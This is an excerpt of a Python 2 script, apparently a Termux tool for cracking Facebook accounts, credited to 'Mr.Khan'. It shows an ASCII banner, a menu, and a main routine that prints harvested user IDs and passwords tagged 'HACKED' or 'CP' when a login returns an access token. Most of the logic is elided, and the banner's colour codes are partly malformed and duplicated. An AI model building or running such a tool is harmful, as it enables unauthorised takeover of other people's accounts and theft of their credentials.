...
\033[0;94m__  __      _  ___     

\033[0;94|  \/  |    | |/ / |

\033[0;96 | \  / |_ __| ' /| |

\033[0;96m | \  / |_ __| ' /| |__   __ _ _ __  

\033[0;96m  | |\/| | '__|  < | '_ \ / _` | '_ \ 

\033[0;96m | |  | | |_ | . \| | | | (_| | | | |

\033[0;96m  |_|  |_|_(_)|_|\_\_| |_|\__,_|_| |_|

""")

print("\033[0;91mThis Tool's Free By Mr.Khan")
...
def menu():
    ...
    print '\033[0;93mAUTHOR   : Mr.khan'

    print '\033[0;94mFACEBOOK : Termux teacher Mr.khan'

    print '\033[0;96mGITHUB   : Mr.khan'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[Mr.Khan-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;91m[Mr.Khan-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
